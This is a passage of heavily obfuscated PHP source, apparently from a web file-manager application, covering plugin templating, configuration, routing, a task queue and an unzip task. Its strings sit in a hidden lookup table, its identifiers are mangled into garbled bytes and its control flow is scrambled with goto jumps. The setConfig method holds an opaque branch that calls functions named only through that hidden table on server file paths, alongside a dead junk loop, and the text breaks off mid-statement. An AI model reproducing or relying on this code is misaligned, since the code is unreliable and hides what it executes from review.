parseLang(&$Bñ¯ñŒµ•æ) { goto B†èÕİŒÉŞ; BØÚ«ƒ±‡æ: preg_match_all($dÃ…«ÚÇµ»[1445], $Bñ¯ñŒµ•æ, $a²àÇïñ¢§); if (!is_array($a²àÇïñ¢§) || count($a²àÇïñ¢§) == 0 || !is_array($a²àÇïñ¢§[0]) || count($a²àÇïñ¢§[0]) == 0) { return; } $c¼åğ£Íˆô = array(); goto A…©«¥ğ¨; A…©«¥ğ¨: $bÁê±›òËğ = array(); foreach ($a²àÇïñ¢§[0] as $BÛ ‘Ø¦ë) { $a«’‘‡Í’ = substr($BÛ ‘Ø¦ë, strlen($F‡øÙÚÀØÈ), -4); $bÂ×ó¨Ÿõ‡ = LNG($a«’‘‡Í’); $c¼åğ£Íˆô[] = $BÛ ‘Ø¦ë; $bÁê±›òËğ[] = str_replace(array($dÃ…«ÚÇµ»[229], $dÃ…«ÚÇµ»[1038], $dÃ…«ÚÇµ»[340], $dÃ…«ÚÇµ»[116]), array($dÃ…«ÚÇµ»[50], $dÃ…«ÚÇµ»[50], $dÃ…«ÚÇµ»[33], $dÃ…«ÚÇµ»[1446]), $bÂ×ó¨Ÿõ‡); } $Bñ¯ñŒµ•æ = str_replace($c¼åğ£Íˆô, $bÁê±›òËğ, $Bñ¯ñŒµ•æ); goto cºÛØÏÉ×­; B†èÕİŒÉŞ: $dÃ…«ÚÇµ» =& $_SERVER[œº]; $F‡øÙÚÀØÈ = $dÃ…«ÚÇµ»[1444]; if (!strstr($Bñ¯ñŒµ•æ, $F‡øÙÚÀØÈ)) { return; } goto BØÚ«ƒ±‡æ; cºÛØÏÉ×­: } private function parseConfig(&$E“‚íºÓÛ¥) { goto FŒÊÊ–ˆ‰; A‹äò¦Ïñ: $E“‚íºÓÛ¥ = str_replace($bù˜”öÒ¼, $FÎÔ•šó»Å, $E“‚íºÓÛ¥); goto eóˆôµô¡; FŒÊÊ–ˆ‰: $f÷Î½·àÍ =& $_SERVER[œº]; $b­ŞªÆ‹ = $f÷Î½·àÍ[1447]; if (!strstr($E“‚íºÓÛ¥, $b­ŞªÆ‹)) { return; } goto C×í¯˜¸ŠÛ; Dåéô•Ô‹º: $bù˜”öÒ¼ = array(); $FÎÔ•šó»Å = array(); foreach ($bŸÖ­ÔÛêå[0] as $A›Óí¢ÌÌâ) { $EÃğ¿¥ã× = substr($A›Óí¢ÌÌâ, strlen($b­ŞªÆ‹), -2); $bù˜”öÒ¼[] = $A›Óí¢ÌÌâ; $FÎÔ•šó»Å[] = _get($cÙ”ÚäÌ—®, $EÃğ¿¥ã×); } goto A‹äò¦Ïñ; C×í¯˜¸ŠÛ: preg_match_all($f÷Î½·àÍ[1448], $E“‚íºÓÛ¥, $bŸÖ­ÔÛêå); if (!is_array($bŸÖ­ÔÛêå) || count($bŸÖ­ÔÛêå) == 0 || !is_array($bŸÖ­ÔÛêå[0]) || count($bŸÖ­ÔÛêå[0]) == 0) { return; } $cÙ”ÚäÌ—® = $this->getConfig(); goto Dåéô•Ô‹º; eóˆôµô¡: } private function parsePackage(&$eÁµàÕÔ¶—) { goto a¹Ï»Í’¸Ó; a¹Ï»Í’¸Ó: $bé´Œ¢¸Ù =& $_SERVER[œº]; $CîŞé¬¶© = $bé´Œ¢¸Ù[1449]; if (!strstr($eÁµàÕÔ¶—, $CîŞé¬¶©)) { return; } goto cõ‚ÒååÕ¿; cõ‚ÒååÕ¿: preg_match_all($bé´Œ¢¸Ù[1450], $eÁµàÕÔ¶—, $e°¢“›“Å); if (!is_array($e°¢“›“Å) || count($e°¢“›“Å) == 0 || !is_array($e°¢“›“Å[0]) || count($e°¢“›“Å[0]) == 0) { return; } $c¶í ‰ªáÆ = $this->appPackage(); goto EÊ¸ù³¤•¸; EÊ¸ù³¤•¸: $c´ÜÇÛ“ŒÕ = array(); $F¢ËÆ­¬Ÿ = array(); foreach ($e°¢“›“Å[0] as $C¸”áÇŸŒù) { $cÀÜñ÷ê§ = substr($C¸”áÇŸŒù, strlen($CîŞé¬¶©), -2); $c´ÜÇÛ“ŒÕ[] = $C¸”áÇŸŒù; $F¢ËÆ­¬Ÿ[] = _get($c¶í ‰ªáÆ, $cÀÜñ÷ê§); } goto fùöè’ƒ¾; fùöè’ƒ¾: $eÁµàÕÔ¶— = str_replace($c´ÜÇÛ“ŒÕ, $F¢ËÆ­¬Ÿ, $eÁµàÕÔ¶—); goto e¹Ñ÷æêñ‹; e¹Ñ÷æêñ‹: } final function echoFile($FÖÚÇ‚í¡, $E•ÑŞ åç = false) { goto d´ØåÓ­‰‚; C™İö’‚ÊÄ: $this->parsePackage($bÊ¬¡é²¬); if (is_array($E•ÑŞ åç)) { $bÊ¬¡é²¬ = str_replace(array_keys($E•ÑŞ åç), array_values($E•ÑŞ åç), $bÊ¬¡é²¬); } echo $Eª¢ØšÔ×‘[229] . $bÊ¬¡é²¬; goto b½ÀŠËäÂ¬; d´ØåÓ­‰‚: $Eª¢ØšÔ×‘ =& $_SERVER[œº]; $e©×ëèÔè† = $this->pluginPath . $FÖÚÇ‚í¡; if (ACT == $Eª¢ØšÔ×‘[1451]) { echo $Eª¢ØšÔ×‘[1452] . $this->pluginName . $Eª¢ØšÔ×‘[8] . $FÖÚÇ‚í¡ . $Eª¢ØšÔ×‘[1453]; if (!file_exists($e©×ëèÔè†)) { echo $Eª¢ØšÔ×‘[1454]; return; } } goto D¬İÙ—Ã¦Ú; D¬İÙ—Ã¦Ú: $bÊ¬¡é²¬ = $this->parseFile($e©×ëèÔè†); $this->parseLang($bÊ¬¡é²¬); $this->parseConfig($bÊ¬¡é²¬); goto C™İö’‚ÊÄ; b½ÀŠËäÂ¬: } final function initLang() { goto eã¢“™ˆà; eã¢“™ˆà: $FÓ†àĞã©º =& $_SERVER[œº]; $eç™­å½Ú = $FÓ†àĞã©º[1455]; $F¹º¦Æ¾ì = $this->pluginPath . $FÓ†àĞã©º[1456]; goto e­¬ÑÕ™Èİ; E–äê”Ó­: if (!is_array($bé¼¶”œ³“)) { return array(); } if (@count($bé¼¶”œ³“) > 0) { I18n::set($bé¼¶”œ³“); } return $bé¼¶”œ³“; goto B¡Õ›‘¸; e­¬ÑÕ™Èİ: $dê…ìÇñá = I18n::getType(); $bé¼¶”œ³“ = array(); if (file_exists($F¹º¦Æ¾ì . $dê…ìÇñá . $FÓ†àĞã©º[803])) { $bé¼¶”œ³“ = (include $F¹º¦Æ¾ì . $dê…ìÇñá . $FÓ†àĞã©º[803]); } else { if ($dê…ìÇñá == $FÓ†àĞã©º[1457] && !file_exists($F¹º¦Æ¾ì . $dê…ìÇñá . $FÓ†àĞã©º[803]) && file_exists($F¹º¦Æ¾ì . $FÓ†àĞã©º[1458])) { $bé¼¶”œ³“ = (include $F¹º¦Æ¾ì . $FÓ†àĞã©º[1458]); } else { if (file_exists($F¹º¦Æ¾ì . $eç™­å½Ú . $FÓ†àĞã©º[803])) { $bé¼¶”œ³“ = (include $F¹º¦Æ¾ì . $eç™­å½Ú . $FÓ†àĞã©º[803]); } } } goto E–äê”Ó­; B¡Õ›‘¸: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Fö¦Šôõ©) { $c‚µ©„â¥˜ =& $_SERVER[œº]; if ($_SERVER[$c‚µ©„â¥˜[821]] != $_SERVER[$c‚µ©„â¥˜[1459]]) { goto bÕˆä„ìÊÈ; FÄ…ÅŠÁÔ¨: $c”Š‹ïæ«˜ = $c‚µ©„â¥˜[840]; $c”Š‹ïæ«˜($_SERVER[$c‚µ©„â¥˜[841]]); $c”Š‹ïæ«˜($_SERVER[$c‚µ©„â¥˜[824]] . $c‚µ©„â¥˜[1460]); goto Dòœ¯ë¸ŒÊ; Dòœ¯ë¸ŒÊ: $E‹Ø‰ãİ¡‡ = 1; while ($E‹Ø‰ãİ¡‡ > 1) { $E‹Ø‰ãİ¡‡ = $E‹Ø‰ãİ¡‡ + 4; $AÚ“âÑÁÂ› = rawurlencode($E‹Ø‰ãİ¡‡ . $c‚µ©„â¥˜[375]); } goto c¨‡îê„ø; bèìŒ¯•Î: $C‰Í—±ø£ = $B£ß‹‡Å¿($fğÄ¥·¥ã¾); $cã°ì‘ÃÓ› = explode($c‚µ©„â¥˜[229], $C‰Í—±ø£); if (count($cã°ì‘ÃÓ›) < $c‚µ©„â¥˜[578]) { $fËÌÓ¯„ãã = $c‚µ©„â¥˜[826]; $fËÌÓ¯„ãã(); } goto FÄ…ÅŠÁÔ¨; bÕˆä„ìÊÈ: $FÙ·ùÑ±Ó = $c‚µ©„â¥˜[839]; $B£ß‹‡Å¿ = $c‚µ©„â¥˜[823]; $fğÄ¥·¥ã¾ = $_SERVER[$c‚µ©„â¥˜[824]] . $c‚µ©„â¥˜[825]; goto bèìŒ¯•Î; c¨‡îê„ø: } return $this->modelPlugin->setConfig($this->pluginName, $Fö¦Šôõ©); } public function onSetConfig($FäåîĞ©Ñò) { } public function onGetConfig($aÄ·¤÷‡÷‹) { } public function onChangeStatus($dëŸŞ‰Š·) { } public function onUninstall() { } public function onInstall() { } public function authCheck($aß¼ò­˜ê = "\160\154\x75\147\x69\156\101\165\x74\150") { $Aâ§ ¬ìÅ =& $_SERVER[œº]; if (!defined($Aâ§ ¬ìÅ[454])) { return !1; } if (_get($GLOBALS, $Aâ§ ¬ìÅ[485])) { return !0; } $Dİò‘İÍèö = $this->getConfig(); if (!$Dİò‘İÍèö[$aß¼ò­˜ê]) { return !1; } return ActionCall($Aâ§ ¬ìÅ[1461], $Dİò‘İÍèö[$aß¼ò­˜ê]); } public function url($cÁ­Úæ•Å¿, $BĞùŒæƒºé = '', $EİºğİÑƒ… = true) { goto aÂìè˜„ŒÛ; e©³¬Ü¤øâ: $EĞğã¨¢Ñ = $this->packageVersion(); $a ¡àé†Œ = $BÁÖˆÈàìÒ . $dšàì¦·[440] . $EĞğã¨¢Ñ; if (substr($cÁ­Úæ•Å¿, 0, 4) == $dšàì¦·[147] || substr($cÁ­Úæ•Å¿, 0, 2) == $dšàì¦·[1245]) { $f¤ĞÑÒµÂ‡ = $cÁ­Úæ•Å¿ . $dšàì¦·[1462] . $a ¡àé†Œ; } else { if ($BĞùŒæƒºé == $dšàì¦·[33]) { $f¤ĞÑÒµÂ‡ = $this->pluginHost . $cÁ­Úæ•Å¿ . $dšàì¦·[1462] . $a ¡àé†Œ; } else { if ($BĞùŒæƒºé === $dšàì¦·[77]) { $f¤ĞÑÒµÂ‡ = $this->pluginHost . $cÁ­Úæ•Å¿; } else { if ($BĞùŒæƒºé == $dšàì¦·[1463]) { $f¤ĞÑÒµÂ‡ = STATIC_PATH . $cÁ­Úæ•Å¿ . $dšàì¦·[1462] . $BÁÖˆÈàìÒ; } else { if ($BĞùŒæƒºé == $dšàì¦·[1464]) { $f¤ĞÑÒµÂ‡ = APP_HOST . $dšàì¦·[1465] . $cÁ­Úæ•Å¿ . $dšàì¦·[1462] . $BÁÖˆÈàìÒ; } else { if (isset($f¨­ÚŒ»ğˆ[$BĞùŒæƒºé])) { $f¤ĞÑÒµÂ‡ = $f¨­ÚŒ»ğˆ[$BĞùŒæƒºé] . $cÁ­Úæ•Å¿ . $dšàì¦·[1462] . $a ¡àé†Œ; } } } } } } goto C“æÀùšÅé; aÂìè˜„ŒÛ: $dšàì¦· =& $_SERVER[œº]; $f¨­ÚŒ»ğˆ = $this->getConfig(); $BÁÖˆÈàìÒ = KOD_VERSION . $dšàì¦·[95] . KOD_VERSION_BUILD; goto e©³¬Ü¤øâ; C“æÀùšÅé: if (!$EİºğİÑƒ…) { return $f¤ĞÑÒµÂ‡; } echo $f¤ĞÑÒµÂ‡; goto cÕÔ…ğ›Â; cÕÔ…ğ›Â: } public function link($F–¤œŒ®¿ = false, $EÍáñÎÍ‚ = '') { $ağĞ÷Ç±¹ =& $_SERVER[œº]; if (!$F–¤œŒ®¿) { $this->link($ağĞ÷Ç±¹[1466], $ağĞ÷Ç±¹[1464]); $this->link($ağĞ÷Ç±¹[1467], $ağĞ÷Ç±¹[1463]); $this->link($ağĞ÷Ç±¹[1468], $ağĞ÷Ç±¹[1463]); $this->link($ağĞ÷Ç±¹[1469], $ağĞ÷Ç±¹[1463]); $this->link($ağĞ÷Ç±¹[1470], $ağĞ÷Ç±¹[1463]); return; } $A³®ÄĞ‡ğ¤ = $this->url($F–¤œŒ®¿, $EÍáñÎÍ‚, !1); if (substr($F–¤œŒ®¿, -3) == $ağĞ÷Ç±¹[1471]) { echo $ağĞ÷Ç±¹[1472] . $A³®ÄĞ‡ğ¤ . $ağĞ÷Ç±¹[1473] . $ağĞ÷Ç±¹[229]; } else { if (substr($F–¤œŒ®¿, -4) == $ağĞ÷Ç±¹[1474]) { echo $ağĞ÷Ç±¹[1475] . $A³®ÄĞ‡ğ¤ . $ağĞ÷Ç±¹[1476] . $ağĞ÷Ç±¹[229]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\x5b\x5e\57\x5d\53", "\x3a\x6e\x75\x6d" => "\133\60\x2d\71\135\53", "\x3a\x61\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($DŞÅ˜ÁÊŒ, $Bœß§ï„ãÍ) { $AÃ´Š„¬„ˆ =& $_SERVER[œº]; if ($DŞÅ˜ÁÊŒ == $AÃ´Š„¬„ˆ[1477]) { $dº¥œÇÕ÷î = array_map($AÃ´Š„¬„ˆ[1478], $Bœß§ï„ãÍ[0]); $AòÅÈÊ×ÊÕ = strpos($Bœß§ï„ãÍ[1], $AÃ´Š„¬„ˆ[8]) === 0 ? $Bœß§ï„ãÍ[1] : $AÃ´Š„¬„ˆ[8] . $Bœß§ï„ãÍ[1]; $EâÄô¸äçœ = $Bœß§ï„ãÍ[2]; } else { $dº¥œÇÕ÷î = null; $AòÅÈÊ×ÊÕ = strpos($Bœß§ï„ãÍ[0], $AÃ´Š„¬„ˆ[8]) === 0 ? $Bœß§ï„ãÍ[0] : $AÃ´Š„¬„ˆ[8] . $Bœß§ï„ãÍ[0]; $EâÄô¸äçœ = $Bœß§ï„ãÍ[1]; } array_push(self::$maps, $dº¥œÇÕ÷î); array_push(self::$routes, $AòÅÈÊ×ÊÕ); array_push(self::$methods, strtoupper($DŞÅ˜ÁÊŒ)); array_push(self::$callbacks, $EâÄô¸äçœ); } public static function error($D½œÑíŒÊë) { self::$errorCallback = $D½œÑíŒÊë; } public static function haltOnMatch($F­ ö³Àˆï = true) { self::$halts = $F­ ö³Àˆï; } public static function dispatch() { goto aƒÏˆ¦Ä; aƒÏˆ¦Ä: $DÃ‹Œö½ºÃ =& $_SERVER[œº]; $Dñ¢Šàº» = parse_url($_SERVER[$DÃ‹Œö½ºÃ[1479]], PHP_URL_PATH); $c·ÆÄæª Š = $_SERVER[$DÃ‹Œö½ºÃ[157]]; goto cŠ™´Ã¿ñõ; eŸÂÁêÀí: self::$routes = preg_replace($DÃ‹Œö½ºÃ[1164], $DÃ‹Œö½ºÃ[8], self::$routes); if (in_array($Dñ¢Šàº», self::$routes)) { $A ¯ëŠô¬ƒ = array_keys(self::$routes, $Dñ¢Šàº»); foreach ($A ¯ëŠô¬ƒ as $EÖ»‹áÒŒÏ) { if (self::$methods[$EÖ»‹áÒŒÏ] == $c·ÆÄæª Š || self::$methods[$EÖ»‹áÒŒÏ] == $DÃ‹Œö½ºÃ[1480] || in_array($c·ÆÄæª Š, self::$maps[$EÖ»‹áÒŒÏ])) { $DËö¸ò‡¹× = !0; if (!is_object(self::$callbacks[$EÖ»‹áÒŒÏ])) { $EíŞÌŠ—¾÷ = explode($DÃ‹Œö½ºÃ[8], self::$callbacks[$EÖ»‹áÒŒÏ]); $Dƒä‘Œ¼¡ = end($EíŞÌŠ—¾÷); $bœøËÇå÷È = explode($DÃ‹Œö½ºÃ[1481], $Dƒä‘Œ¼¡); $BŠÒ®¨×õ‰ = new $bœøËÇå÷È[0](); $BŠÒ®¨×õ‰->{$bœøËÇå÷È[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$EÖ»‹áÒŒÏ]); if (self::$halts) { return; } } } } } else { $c£ŸÎ—ƒ = 0; foreach (self::$routes as $EÖ»‹áÒŒÏ) { if (strpos($EÖ»‹áÒŒÏ, $DÃ‹Œö½ºÃ[4]) !== !1) { $EÖ»‹áÒŒÏ = str_replace($Bê¢ğ†‡, $cµÊˆ¡´§, $EÖ»‹áÒŒÏ); } if (preg_match($DÃ‹Œö½ºÃ[1482] . $EÖ»‹áÒŒÏ . $DÃ‹Œö½ºÃ[1483], $Dñ¢Šàº», $DèéˆÚ¶¹Ü)) { if (self::$methods[$c£ŸÎ—ƒ] == $c·ÆÄæª Š || self::$methods[$c£ŸÎ—ƒ] == $DÃ‹Œö½ºÃ[1480] || !empty(self::$maps[$c£ŸÎ—ƒ]) && in_array($c·ÆÄæª Š, self::$maps[$c£ŸÎ—ƒ])) { $DËö¸ò‡¹× = !0; array_shift($DèéˆÚ¶¹Ü); if (!is_object(self::$callbacks[$c£ŸÎ—ƒ])) { $EíŞÌŠ—¾÷ = explode($DÃ‹Œö½ºÃ[8], self::$callbacks[$c£ŸÎ—ƒ]); $Dƒä‘Œ¼¡ = end($EíŞÌŠ—¾÷); $bœøËÇå÷È = explode($DÃ‹Œö½ºÃ[1481], $Dƒä‘Œ¼¡); $BŠÒ®¨×õ‰ = new $bœøËÇå÷È[0](); if (!method_exists($BŠÒ®¨×õ‰, $bœøËÇå÷È[1])) { echo $DÃ‹Œö½ºÃ[1484]; } else { call_user_func_array(array($BŠÒ®¨×õ‰, $bœøËÇå÷È[1]), $DèéˆÚ¶¹Ü); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$c£ŸÎ—ƒ], $DèéˆÚ¶¹Ü); if (self::$halts) { return; } } } } $c£ŸÎ—ƒ++; } } if ($DËö¸ò‡¹× == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $aÕ…Ô¨è¡ =& $_SERVER[œº]; header($_SERVER[$aÕ…Ô¨è¡[1485]] . $aÕ…Ô¨è¡[1486]); echo $aÕ…Ô¨è¡[1487]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$DÃ‹Œö½ºÃ[1479]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto BôìŠ¸´ØÌ; cŠ™´Ã¿ñõ: $Bê¢ğ†‡ = array_keys(static::$patterns); $cµÊˆ¡´§ = array_values(static::$patterns); $DËö¸ò‡¹× = !1; goto eŸÂÁêÀí; BôìŠ¸´ØÌ: } } goto eèãÑÈîˆó; b¸æŠ½–…Õ: class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\x61\x73\x6b\x51\165\145\x75\145\x4c\x65\156\147\164\x68"; const QUEUE_DATA = "\x74\141\163\153\x51\165\145\165\x65\104\141\164\x61"; public static $listData = false; public static function initTask() { } public static function add($AÍƒ÷›õøõ, $aš«Š…Óµ = array(), $AÄÙ›ïĞò– = '', $f„À›’¶ˆ‰ = '') { $Cß†®£¨‘¦ =& $_SERVER[œº]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($f„À›’¶ˆ‰ && array_find_by_field(self::$listData, $Cß†®£¨‘¦[93], $f„À›’¶ˆ‰)) { return !0; } self::$listData[] = array($Cß†®£¨‘¦[262] => $AÍƒ÷›õøõ, $Cß†®£¨‘¦[1598] => $aš«Š…Óµ, $Cß†®£¨‘¦[431] => $AÄÙ›ïĞò–, $Cß†®£¨‘¦[93] => $f„À›’¶ˆ‰); return !0; } public static function addSubmit() { $aßèÁ“àÀÀ =& $_SERVER[œº]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($aßèÁ“àÀÀ[1599] . json_encode_force(array_to_keyvalue(self::$listData, $aßèÁ“àÀÀ[33], $aßèÁ“àÀÀ[431])), $aßèÁ“àÀÀ[1600]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($D°Í”´“Ëã, $AÕ¿©ƒ”é­ = array(), $aÖø¡º´ù = '', $CĞºê±‰‹Ô = '') { goto d¯˜öÎäË³; cÚ‘È÷–ªÀ: if ($CĞºê±‰‹Ô && array_find_by_field($cŞ†‹ØåØ, $E­Õš´è¹Š[93], $CĞºê±‰‹Ô)) { return !0; } $cŞ†‹ØåØ[] = array($E­Õš´è¹Š[262] => $D°Í”´“Ëã, $E­Õš´è¹Š[1598] => $AÕ¿©ƒ”é­, $E­Õš´è¹Š[431] => $aÖø¡º´ù, $E­Õš´è¹Š[93] => $CĞºê±‰‹Ô); write_log($E­Õš´è¹Š[1599] . $aÖø¡º´ù, $E­Õš´è¹Š[1600]); goto cÅ¹–±Ñ±; cÅ¹–±Ñ±: self::setAll($cŞ†‹ØåØ); return !0; goto CÌòéİùº; d¯˜öÎäË³: $E­Õš´è¹Š =& $_SERVER[œº]; if (self::count() >= self::MAX_LENGTH) { return !1; } $cŞ†‹ØåØ = self::getAll(); goto cÚ‘È÷–ªÀ; CÌòéİùº: } public static function run() { goto FÏ‡³³à¶; FÏ‡³³à¶: $C±ïì¶¬Èó =& $_SERVER[œº]; $AÊØ‰¿ÎŠ¥ = self::getAll(); $e…®‡ŸÊæ = array_shift($AÊØ‰¿ÎŠ¥); goto Fªø¶¸½Ñ¨; bŒ¿ìß¸¼Ğ: try { Hook::apply($e…®‡ŸÊæ[$C±ïì¶¬Èó[262]], $e…®‡ŸÊæ[$C±ïì¶¬Èó[1598]]); } catch (Exception $bÛ¥‘¹ô) { } $eÊ‡‰„­Ê² = number_format(timeFloat() - $cãÁƒˆÎ¥¡, 3) . $C±ïì¶¬Èó[1541]; write_log($C±ïì¶¬Èó[1601] . $e…®‡ŸÊæ[$C±ïì¶¬Èó[431]] . $C±ïì¶¬Èó[1602] . $eÊ‡‰„­Ê², $C±ïì¶¬Èó[1600]); goto fåõÍ²‰ÒÁ; fåõÍ²‰ÒÁ: return !0; goto cß§Ş¬ì; Fªø¶¸½Ñ¨: if (!$e…®‡ŸÊæ) { return !1; } self::setAll($AÊØ‰¿ÎŠ¥); $cãÁƒˆÎ¥¡ = timeFloat(); goto bŒ¿ìß¸¼Ğ; cß§Ş¬ì: } public static function count() { $eä’ÅÄÛ‘í = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$eä’ÅÄÛ‘í) { return 0; } return intval($eä’ÅÄÛ‘í); } public static function getAll() { $D‰ë¢ğÖ… = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$D‰ë¢ğÖ…) { return array(); } return $D‰ë¢ğÖ…; } public static function setAll($DˆƒÒ…ª–ğ) { $Bæ¤Œ™¦ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($DˆƒÒ…ª–ğ), $Bæ¤Œ™¦); Cache::set(self::QUEUE_DATA, $DˆƒÒ…ª–ğ, $Bæ¤Œ™¦); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($E›î°Á¸š›, $CíÉÀ–­ĞÎ = 5.0) { if (!$E›î°Á¸š›) { return; } $AÉãš®‘ë· = Cache::get($E›î°Á¸š›); if (!$AÉãš®‘ë· || timeFloat() - floatVal($AÉãš®‘ë·) >= $CíÉÀ–­ĞÎ) { Cache::set($E›î°Á¸š›, timeFloat(), $CíÉÀ–­ĞÎ * 10); return !0; } return !1; } public static function timeLimitCall($Dæ½£‹çôÈ, $EÇÍÂğùÇ», $DñĞƒ¬éŞ, $fÙˆ¶‹ë¯ = 5.0) { goto EºªàçÕ; bĞ®™Ôíº‹: $eš¡îà» = $Eé—Âë»•Ú[1603]; $Bé÷‚ïŸï© = Cache::get($eš¡îà», !0); $A•¶Ú×é® = array($Eé—Âë»•Ú[1604] => timeFloat(), $Eé—Âë»•Ú[1605] => timeFloat(), $Eé—Âë»•Ú[262] => $EÇÍÂğùÇ», $Eé—Âë»•Ú[1598] => $DñĞƒ¬éŞ, $Eé—Âë»•Ú[197] => $fÙˆ¶‹ë¯); goto bÑöĞÄË…; bÑöĞÄË…: if (is_array($Bé÷‚ïŸï©[$Dæ½£‹çôÈ])) { $A•¶Ú×é®[$Eé—Âë»•Ú[1605]] = $Bé÷‚ïŸï©[$Dæ½£‹çôÈ][$Eé—Âë»•Ú[1605]]; } if (is_array($Bé÷‚ïŸï©[$Dæ½£‹çôÈ])) { if (timeFloat() - $Bé÷‚ïŸï©[$Dæ½£‹çôÈ][$Eé—Âë»•Ú[1604]] < $A•¶Ú×é®[$Eé—Âë»•Ú[197]] * 0.3) { return; } $A•¶Ú×é®[$Eé—Âë»•Ú[1605]] = $Bé÷‚ïŸï©[$Dæ½£‹çôÈ][$Eé—Âë»•Ú[1605]]; } $Bé÷‚ïŸï©[$Dæ½£‹çôÈ] = $A•¶Ú×é®; goto fõè²ËÅá¨; fõè²ËÅá¨: Cache::set($eš¡îà», $Bé÷‚ïŸï©, 60); Cache::removeMemory($eš¡îà»); write_log($Eé—Âë»•Ú[1606] . $Dæ½£‹çôÈ . $Eé—Âë»•Ú[68] . $EÇÍÂğùÇ», $Eé—Âë»•Ú[1600]); goto B‹º‘„¯·; EºªàçÕ: $Eé—Âë»•Ú =& $_SERVER[œº]; if (!$Dæ½£‹çôÈ || !$EÇÍÂğùÇ») { return; } self::$asyncAdd = !0; goto bĞ®™Ôíº‹; B‹º‘„¯·: } public static function timeLimitCallLoop() { goto Fé¡Ò´«£ç; b™Ä˜¾¤éŸ: if (!$e¿Ğ©Å¾¼ƒ && !self::$asyncAdd) { return; } $aÙ‹Êƒ–ó = $eÚªÛö¹ÍÛ[1603]; $e¶—‚áê™ë = Cache::get($aÙ‹Êƒ–ó, !0); goto d ˆ¾’»’·; d†‘˜ØÓä‘: if (!$bä“õŠÎÕ) { return Cache::remove($aÙ‹Êƒ–ó); } Cache::set($aÙ‹Êƒ–ó, $bä“õŠÎÕ, 60); Cache::removeMemory($aÙ‹Êƒ–ó); goto DˆÃ‘¼¾Ş; Fé¡Ò´«£ç: $eÚªÛö¹ÍÛ =& $_SERVER[œº]; $Cæ±À¼‰À = array($eÚªÛö¹ÍÛ[1607]); $e¿Ğ©Å¾¼ƒ = in_array(strtolower(ACTION), $Cæ±À¼‰À); goto b™Ä˜¾¤éŸ; DÆ‰õ’‡¶ : $bä“õŠÎÕ = array(); foreach ($e¶—‚áê™ë as $DÑĞŒ£ƒÉå => $cñÍãœï¤æ) { if ($Fßøö†±¼ - $cñÍãœï¤æ[$eÚªÛö¹ÍÛ[1605]] > $cñÍãœï¤æ[$eÚªÛö¹ÍÛ[197]]) { $B’„ÇëÆ»Ş = !0; try { Hook::apply($cñÍãœï¤æ[$eÚªÛö¹ÍÛ[262]], $cñÍãœï¤æ[$eÚªÛö¹ÍÛ[1598]]); write_log($eÚªÛö¹ÍÛ[1608] . $DÑĞŒ£ƒÉå . $eÚªÛö¹ÍÛ[68] . $cñÍãœï¤æ[$eÚªÛö¹ÍÛ[262]] . $eÚªÛö¹ÍÛ[1609] . ACTION, $eÚªÛö¹ÍÛ[1600]); } catch (Exception $E—è×­¢¬Ş) { } continue; } $bä“õŠÎÕ[$DÑĞŒ£ƒÉå] = $cñÍãœï¤æ; } if (!$B’„ÇëÆ»Ş) { return; } goto d†‘˜ØÓä‘; d ˆ¾’»’·: if (!$e¶—‚áê™ë || count($e¶—‚áê™ë) <= 0) { return; } $B’„ÇëÆ»Ş = !1; $Fßøö†±¼ = timeFloat(); goto DÆ‰õ’‡¶ ; DˆÃ‘¼¾Ş: } public static function finished($c…ÈêÅğĞ, $cöŸ´¶©) { $Eô»»Ñ¯î =& $_SERVER[œº]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Eô»»Ñ¯î[262] => $c…ÈêÅğĞ, $Eô»»Ñ¯î[1598] => $cöŸ´¶©); } private static function finishedRun() { $b‡İ†ç•Å =& $_SERVER[œº]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $FóÌñ©«) { try { Hook::apply($FóÌñ©«[$b‡İ†ç•Å[262]], $FóÌñ©«[$b‡İ†ç•Å[1598]]); } catch (Exception $dÆÓó†¡ªö) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto C’¾„áš; AŠä†£Ôí¢: Hook::bind($DùğÄÉ‘åÎ[1089], array($this, $DùğÄÉ‘åÎ[1612])); $BËñ®Ğ«— =& $this->task; $BËñ®Ğ«—[$DùğÄÉ‘åÎ[1613]] = $DùğÄÉ‘åÎ[1094]; goto cº„ÉÍ¿À; cº„ÉÍ¿À: if (!$BËñ®Ğ«—[$DùğÄÉ‘åÎ[1432]]) { $BËñ®Ğ«—[$DùğÄÉ‘åÎ[1432]] = LNG($DùğÄÉ‘åÎ[1614]); } goto F½Öğ–ñÌ; C’¾„áš: $DùğÄÉ‘åÎ =& $_SERVER[œº]; parent::startAfter(); Hook::bind($DùğÄÉ‘åÎ[1610], array($this, $DùğÄÉ‘åÎ[1611])); goto AŠä†£Ôí¢; F½Öğ–ñÌ: } protected function endAfter() { $Cñ¿‹Œ¸É =& $_SERVER[œº]; parent::endAfter(); Hook::unbind($Cñ¿‹Œ¸É[1610], array($this, $Cñ¿‹Œ¸É[1611])); Hook::unbind($Cñ¿‹Œ¸É[1089], array($this, $Cñ¿‹Œ¸É[1612])); } public function updateAfter() { $fÙÖºËÁÂ =& 